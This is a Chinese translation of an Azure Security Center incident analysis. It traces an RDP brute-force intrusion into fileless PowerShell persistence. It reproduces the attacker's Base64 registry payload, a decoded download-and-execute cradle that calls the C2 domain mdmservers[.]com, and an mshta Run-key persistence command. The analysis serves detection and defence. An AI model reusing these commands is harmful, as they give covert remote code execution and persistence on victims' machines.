# 【技术分享】Azure Security Center对PowerShell攻击的深入分析

#### 译文声明
本文为翻译文章，原文来源：[azure.microsoft.com](https://azure.microsoft.com)。具体内容及含义以原文为准。
- 译者：shan66
- 预估稿费：200RMB
- 投稿方式：发送邮件至linwei#360.cn 或 登陆网页版在线投稿

## 前言
为了纪念国家网络安全意识月（NCSAM），我们发布了一系列文章，重点介绍 **Azure Security Center** 如何检测、追踪和缓解现实世界中的各种网络攻击。本文将详细分析攻击者如何利用PowerShell运行恶意代码并收集用户凭据。在此之前，先回顾一下本系列中的其他文章：
- [SQL暴力攻击](https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/)
- [比特币挖矿攻击](https://azure.microsoft.com/en-us/blog/how-azure-security-center-detects-a-bitcoin-mining-attack/)
- [基于网络威胁情报的DDoS攻击](https://azure.microsoft.com/en-us/blog/how-azure-security-center-detects-ddos-attack-using-cyber-threat-intelligence/)
- [恶意使用正常应用程序](https://azure.microsoft.com/en-us/blog/how-azure-security-center-aids-in-detecting-good-applications-being-used-maliciously/)

本文将介绍Azure Security Center检测到的一个真实世界的攻击场景，并提供如何在您的环境中检测和防止类似攻击的建议。为保护隐私，受影响公司的名称、计算机名称和用户名均已替换。

## Azure Security Center的原始警报和详细信息
由于远程管理服务（如RDP）广泛存在，黑客们一直在寻找机会通过暴力破解密码进行攻击。我们的案例始于一个大型客户的Azure Security Center控制台，该控制台提示存在RDP暴力攻击活动以及可疑的PowerShell活动。

在Azure Security Center的屏幕截图中，可以看到“Failed RDP Brute Force Attack”警报后面跟着多个异常PowerShell活动的警报。检查最初的“Successful RDP Brute Force Attack”警报时，可以看到攻击时间、受攻击账户、攻击源IP地址（意大利）以及Microsoft’s Threat Intel的“RDP Brute Forcing”报告链接。

成功登录后，Azure Security Center按时间顺序显示了攻击者执行的每个命令行。

## 攻击细节与活动
根据警报提供的信息，调查团队与客户一起审查了从攻击者最初登录时获取的帐户登录日志（事件ID 4624）和进程创建日志（事件ID 4688）。

登录数据显示，攻击者使用了多种用户名和密码组合进行持续的RDP暴力尝试。大多数失败尝试引发了事件ID 4625（帐户登录失败）、状态码0xc000006d（无效登录尝试）和子代码0xc0000064（指定的帐号不存在）。

9月6日上午10:13左右，Substatus码发生变化。使用用户名“ContosoAdmin”导致了不同的状态码0xc000006a（密码错误）。随后，使用“ContosoAdmin”帐户成功登录，类型分别为3和10（远程交互），IP地址为188.125.100.233（意大利）。

登录后的进程创建活动包括执行“whoami”命令查看当前登录用户，使用`net group "Domain Admins" /domain`命令查看“Domain Admins”组成员，执行“qwinsta”命令显示所有Remote Desktop Services会话，启动Taskmgr（Windows任务管理器）以查看或管理进程和服务。

稍后，攻击者执行了一个Base64编码并使用Deflate压缩算法处理的PowerShell命令。我们将进一步解码这些Base64编码的字符串，以挖掘该命令的用法。

约3分钟后，攻击者注销机器，并通过内置的`wevtutil.exe`工具清除所有事件日志以掩盖踪迹。

## 深入分析Base64编码的PowerShell命令
对攻击者的原始命令进行Base64解码后，发现了更多嵌套的Base64编码命令，表明：
- **嵌套的Base64混淆处理**
- **所有级别的命令执行都进行了混淆处理**
- **仅使用注册表的ASEP（自动启动扩展点）作为持久性机制**
- **恶意代码参数存储在注册表中**
- **由于ASEP和参数仅存在于系统注册表中，因此这些命令可以在不借助文件或NTFS组件的情况下以“in-memory”的方式执行**

这是攻击者执行的原始命令：
```powershell
[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersion]
"SeCert"="dwBoAGkAbABlACgAMQApAHsAdAByAHkAewBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALg
BEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBkAG0AcwBlAHIAdgBlAHIAcwAuAGMAbwBtAC8AJwArACgAWwBjAGgAYQBy
AF0AKAA4ADUALQAoAC0AMwA3ACkAKQApACkAfQBjAGEAdABjAGgAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAHMAIAAxADAAfQB9AA=="
```

解码上述注册表项中的Base64值后，发现该命令执行以下操作：
1. 将后续命令所需的参数存储在`HKLMSoftwareMicrosoftWindowsCurrentVersion`下的名为“SeCert”的注册表单元中。
2. 注册表项中的Base64值解码后，实际上是从恶意C2域（mdmservers[.]com）下载命令的脚本。
    ```powershell
    while(1){try{IEX(New-Object Net.WebClient).DownloadString('hxxp[:]//mdmservers[.]com/'+([char](85-(-37))))}catch{Start-Sleep -s 10}}
    ```
3. 通过在`HKLMSoftwareMicrosoftWindowsCurrentVersionRun`中创建名为“SophosMSHTA”的注册表ASEP实现持久性机制。
    ```powershell
    [HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun]
    "SophosMSHTA"="mshta vbscript:CreateObject("Wscript.Shell").Run("powershell.exe -c ""$x=$((gp HKLM:Software\Microsoft\Windows\CurrentVersion SeCert).SeCert);powershell -E $x""",0,True)(window.close)"
    ```
4. 该注册表持久性确保每次机器启动或重启时都会执行恶意命令。
5. 注册表ASEP启动Microsoft脚本引擎（mshta.exe）。
6. Mshta.exe运行PowerShell.exe，读取并解码`HKLMSOFTWAREMicrosoftWindowsCurrentVersion->“SeCert”`的值。
7. `SeCert`注册表值通知PowerShell从`hxxp[:]//mdmservers[.]com`下载并执行恶意脚本。

## 恶意代码的下载和执行
...（待续）

通过以上分析，我们可以更好地理解攻击者如何利用PowerShell进行攻击，并采取相应措施来检测和防止类似攻击。